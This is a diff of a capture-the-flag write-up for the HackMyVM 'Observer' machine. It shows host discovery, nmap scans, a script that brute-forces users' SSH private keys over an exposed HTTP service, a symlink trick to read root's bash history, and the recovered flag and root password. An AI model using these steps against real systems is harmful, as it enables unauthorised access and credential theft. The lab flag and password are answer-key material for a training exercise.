@@ -1,24 +1,32 @@
-# 🖥️ Writeup - Observer 
+---
+icon: linux
+---
 
-**Platform:** HackMyVM  
-**Operating System:** Linux  
+# Observer ​​
+
+## 🖥️ Writeup - Observer
+
+**Platform:** HackMyVM\
+**Operating System:** Linux
 
 > **Tags:** `Linux` `Python` `Fuzzing` `Sudoers` `Systemctl` `Symlink Exploitation` `Bash History`
 
-# INSTALLATION
+## INSTALLATION
 
 We download the `zip` containing the `.ova` of the Observer machine, extract it, and import it into VirtualBox.
 
 We configure the network interface of the Observer machine and run it alongside the attacker machine.
 
-# HOST DISCOVERY
+## HOST DISCOVERY
 
 At this point, we still don’t know which `IP` address is assigned to Observer, so we discover it as follows:
 
 ```bash
 netdiscover -i eth1 -r 10.0.0.0/24
 ```
+
 Info:
+
 ```
 Currently scanning: Finished!   |   Screen View: Unique Hosts                 
                                                                                
@@ -30,22 +38,24 @@ Currently scanning: Finished!   |   Screen View: Unique Hosts
  10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
  10.0.4.3        08:00:27:33:41:f8      1      60  PCS Systemtechnik GmbH      
  10.0.4.28       08:00:27:f6:7e:54      1      60  PCS Systemtechnik GmbH
- ```
+```
 
- We identify with high confidence that the victim’s IP is `10.0.4.28`.
+We identify with high confidence that the victim’s IP is `10.0.4.28`.
 
-# PORT SCANNING
+## PORT SCANNING
 
 Next, we perform a general scan to check which ports are open, followed by a more exhaustive scan to gather relevant service information.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.28
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,3333 --min-rate 5000 10.0.4.28
 ```
+
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-19 17:31 CEST
 Nmap scan report for 10.0.4.28
@@ -100,18 +110,18 @@ Nmap done: 1 IP address (1 host up) scanned in 26.61 seconds
 
 Ports `22` and `3333` are open.
 
-Port `3333` accepts `HTTP` requests and lists files under the `/home/` path.
-After manually probing a few paths, I believe the best approach is to try to retrieve a user’s `id_rsa` `private key` via port `3333`.
+Port `3333` accepts `HTTP` requests and lists files under the `/home/` path. After manually probing a few paths, I believe the best approach is to try to retrieve a user’s `id_rsa` `private key` via port `3333`.
 
 However, we do not know any `usernames`, so we are going to write a Python script to `brute force` the `{user}/.ssh/id_rsa` path.
 
-# BRUTE FORCE
+## BRUTE FORCE
 
 ```bash
 nano brute_rsa.py
 ```
 
 Info:
+
 ```
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
@@ -173,6 +183,7 @@ chmod +x brute_rsa.py
 ```
 
 Info:
+
 ```
 [!!!] PRIVATE KEY FOUND for user: jan
 URL: http://10.0.4.28:3333/jan/.ssh/id_rsa
@@ -219,7 +230,7 @@ U+OPQBwGQPpFUAAAAMamFuQG9ic2VydmVyAQIDBAUGBw==
 
 We obtain the `private key` for user `jan`.
 
-We save this key to a file and set the appropriate permissions so it can be used for user authentication. 
+We save this key to a file and set the appropriate permissions so it can be used for user authentication.
 
 ```bash
 nano jan_id_rsa
@@ -238,7 +249,7 @@ Inside `/home/jan/` we find the `user flag`.
 HMVdDepYxsi8VSucdruB3P7
 ```
 
-# PRIVILEGE ESCALATION
+## PRIVILEGE ESCALATION
 
 To escalate privileges, we first check `sudo` and `SUID` permissions.
 
@@ -247,6 +258,7 @@ sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for jan on observer:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
@@ -258,6 +270,7 @@ User jan may run the following commands on observer:
 We run `/usr/bin/systemctl -l status` and find the following output:
 
 Info:
+
 ```
 ● observer
     State: running
@@ -285,6 +298,7 @@ ls -la /opt/observer
 ```
 
 Info:
+
 ```
 -rwxr-xr-x 1 root root 7376728 ago 21  2023 /opt/observer
 ```
@@ -299,15 +313,16 @@ ln -s /root .
 
 The symlink is created. We browse the `root` directory and view the `.bash_history`.
 
-![alt text](../../images/bash_h.png)
+![alt text](../../.gitbook/assets/bash_h.png)
 
-We find a `password` and use it to authenticate as `root : fuck1ng0bs3rv3rs`. 
+We find a `password` and use it to authenticate as `root : fuck1ng0bs3rv3rs`.
 
 ```bash
 su root
 ```
 
 Info:
+
 ```
 root@observer:/home/jan# whoami
 root
